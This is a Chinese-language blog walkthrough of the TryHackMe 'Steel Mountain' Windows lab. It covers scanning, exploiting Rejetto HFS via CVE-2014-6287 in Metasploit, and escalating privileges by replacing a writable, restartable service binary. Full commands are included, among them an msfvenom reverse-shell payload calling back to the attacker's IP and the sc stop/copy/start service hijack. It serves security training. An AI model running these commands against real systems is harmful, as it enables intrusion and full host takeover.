---
title: "THM Steel Mountain"
description: "TryHackMe篇之Steel Mountain"

date: 2024-10-14T16:27:58+08:00
lastmod: 2025-11-11T12:18:23+08:00

math: true
mermaid: true

categories:
  - TryHackMe
tags:
  - Windows
---
<!--more-->

> 靶机ip：10.10.51.252

# 写在前面

**注意：机器不响应ping命令**

# 信息收集

## nmap扫描

`nmap --min-rate 10000 -Pn -sV -p- 10.10.51.252`

![image-20241014163917459](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241014163927698-310950412.png)

开放若干端口，但是可以看出这是一台windows主机

## 80端口

![image-20241014164041162](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241014164050700-679057908.png)

一个普通的页面，扫下目录

`gobuster dir -u http://10.10.51.252/ -w /usr/share/wordlists/dirb/common.txt`

![image-20241014170540647](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241014170550004-1267980203.png)

没什么有用信息

查看下源码

![image-20241014191656687](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241014191706066-655513886.png)

找到人名`BillHarper`

## SMB

`smbclient -L //10.10.51.252`

![image-20241014191217373](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241014191226841-505937933.png)

不允许匿名登录

## 8080端口

![image-20241014191528445](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241014191537845-1876392148.png)

发现是一个文件服务器版本号是`2.3`，点进去看看

![image-20241014192438848](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241014192448714-1892990057.png)

到这里就知道这个服务器的名字了`Rejetto HTTP File Server`

可以尝试去网上找找是否有历史漏洞

![image-20241014193532643](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241014193542336-1095577421.png)

![image-20241014193625312](https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014193635486-838603181.png)

找到个`CVE-2014-6287`

# 获取初始访问权限

启动msf

![image-20241014193820488](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241014193829983-1899085758.png)

直接搜索这个cve并使用

![image-20241014193956689](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241014194006026-989143443.png)

把必要的参数设置一下

直接run！

![image-20241014195042124](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241014195051743-599602628.png)

获得基础用户权限

![image-20241014195123919](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241014195133488-1609533962.png)

在`C:\Users\bill\Desktop`找到`user.txt`

# 提升至root权限

这台机器上有了一个初始 shell，我们可以进一步枚举操作系统信息并查看将权限升级到root的利用点，使用[PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)的`PowerShell`脚本来查看这台 Windows 机器并确定目标机是否存在任何异常和错误配置

将文件保存到本地，通过msf传上去

![image-20241014200146045](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241014200155434-17085404.png)

可以通过`meterpreter`会话来加载`PowerShell`扩展，并进入 `PowerShell`的shell界面并执行脚本

```powershell
load powershell
powershell_shell
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

![image-20241014200607720](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241014200617323-413379229.png)

发现有个特别的服务`CanRestart`选项被设置为`true`，当这个选项为`true`时，我们就能够在系统上重新启动此服务；而且这个应用程序的目录也是可写的，这意味着我们可以用一个恶意应用程序替换合法的应用程序，一旦服务重新启动，我们的恶意程序将运行

> ServiceName ：AdvancedSystemCareService9
>
> ModifiablePath：C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe

`msfvenom`可用于生成反向shell的payload并将其输出为`windows`可执行文件，我们用`msfvenom`来生成一个和之前的应用程序同名的恶意应用程序:

`msfvenom -p windows/shell_reverse_tcp LHOST=10.14.90.122 LPORT=4444 -e x86/shikata_ga_nai -f exe -o ASCService.exe`

在 `meterpreter` 中上传文件

![image-20241014201539989](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241014201549634-483647248.png)

进入shell，先将这个服务停掉，替换我们的文件

```powershell
shell
sc stop AdvancedSystemCareService9
copy ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
```

![image-20241014201756699](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241014201806112-808045312.png)

关于SC命令（Windows shell不区分大小写）：

```
SC命令的格式：SC [Servername] command Servicename [Optionname= Optionvalues]

Servername：指定服务所在的远程服务器的名称。名称必须采用通用命名约定 (UNC) 格式（“\\myserver”）。如果是在本地运行SC.exe，请忽略此参数。
command ：如query,start,stop,create,config等

Servicename：服务名，也就是要配置的那个服务的名字，例如你要启动一个服务你就输入sc start +你要启动的服务名称（并非是服务显示名称）。
Optionname= Optionvalues：是选项名和选项的值。
```

在重启服务之前，在我们的机器上先启动个监听

![image-20241014201829234](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241014201838886-990526090.png)

然后在靶机中重启服务

`sc start AdvancedSystemCareService9`

![image-20241014201903513](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241014201912815-1720693336.png)

这时就提升到了root权限

![image-20241014202028946](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241014202038317-726923127.png)

在`C:\Users\Administrator\Desktop`找到`root.txt`